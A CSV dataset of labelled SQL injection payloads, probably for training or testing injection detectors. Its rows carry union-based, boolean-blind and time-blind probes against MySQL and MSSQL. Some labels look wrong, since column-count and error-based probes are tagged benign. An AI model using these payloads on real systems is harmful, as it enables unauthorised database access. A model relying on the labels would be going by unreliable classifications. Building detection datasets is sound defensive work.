id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
2406,-3359' order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
2407,"-6618"" ) ) ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 24 chars.,2
2425,1%' ) ) ) waitfor delay '0:0:5' and ( ( ( '%' = ',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2
2462,"iif ( 5571 = 4947,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
2476,-8404 ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 22 chars.,2
2486,"1 ) as ihan where 5298 = 5298 and elt ( 6587 = 3479,3479 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
2506,"-8686"" where 4532 = 4532 or elt ( 3301 = 9065,9065 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
2522,"iif ( 8770 = 9611,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
2527,"-4699 ) as mymz where 3405 = 3405 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
2538,1%' ) ) ) order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 22 chars.,2
2543,"-9432 ) ) as nqya where 8387 = 8387 or elt ( 9242 = 6180,6180 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2
2560,"-6595"" order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
2576,"-9535"" order by 1--",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
2593,-9014' order by 1--,benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 19 chars.,2
2400,"-3862' ) ) union all select 2495,2495,2495,2495,2495,2495,2495--",union_based,generic,0.7,UNION-based payload detected. Payload length: 64 chars.,2
2401,"1' ) as pfwt where 8448 = 8448 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 93 chars.,2
2402,"-5205' ) ) union all select 8592,8592,8592,8592,8592,8592--",union_based,generic,0.7,UNION-based payload detected. Payload length: 59 chars.,2
2405,"-5518 ) as yvqm where 7360 = 7360 union all select 7360,7360#",union_based,generic,0.7,UNION-based payload detected. Payload length: 61 chars.,2
2408,"-6492' ) union all select 7204,7204--",union_based,generic,0.7,UNION-based payload detected. Payload length: 37 chars.,2
2412,"-4304' where 1005 = 1005 union all select 1005,1005#",union_based,generic,0.7,UNION-based payload detected. Payload length: 52 chars.,2
2416,-2625' ) ) or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
2418,"1' ) ) as orvy where 7270 = 7270 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 90 chars.,2
2420,"-1218' union all select 2663,2663,2663,2663--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
2421,"1 ) union all select null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
2424,"-5160' ) as kgjw where 9609 = 9609 union all select 9609,9609--",union_based,generic,0.7,UNION-based payload detected. Payload length: 63 chars.,2
2426,"-5187"" ) union all select 3373,3373#",union_based,generic,0.7,UNION-based payload detected. Payload length: 36 chars.,2
2427,"-1807' ) ) union all select 9853,9853,9853,9853,9853,9853#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
2428,"-7240' ) ) union all select 8064,8064,8064#",union_based,generic,0.7,UNION-based payload detected. Payload length: 43 chars.,2
2434,"1"" ) ) as rign where 1604 = 1604 and 3661 = 3054--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
2435,-6813 ) ) ) or 6872 = 6872 and ( ( ( 7304 = 7304,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 48 chars.,2
2436,"1 ) as wvpl where 9791 = 9791 and make_set ( 3491 = 9067,9067 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 66 chars.,2
2437,1%' ) ) and 7533 = 7533 and ( ( '%' = ',boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 39 chars.,2
2438,"-9858"" or 8592 = 8553",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
2440,-3862' ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
2449,-5694 ) ) as cxnb where 6858 = 6858 or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 51 chars.,2
2461,-7772' ) ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
2463,"-4462%"" ) or 8571 = 8571--",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 26 chars.,2
2470,-2527 ) ) as oqpy where 7468 = 7468 or 3038 = 3038,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
2477,"-2759%"" ) ) or 7769 = 1249#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 27 chars.,2
2487,-5356' ) or 9323 = 9323#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 24 chars.,2
2493,"-9749"" where 7083 = 7083 or make_set ( 7577 = 1182,1182 ) --",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 60 chars.,2
2532,"-5972"" or 8509 = 3448#",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
2534,-7775 or 8571 = 8571--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 22 chars.,2
2539,1 ) and 9198 = 9198--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 21 chars.,2
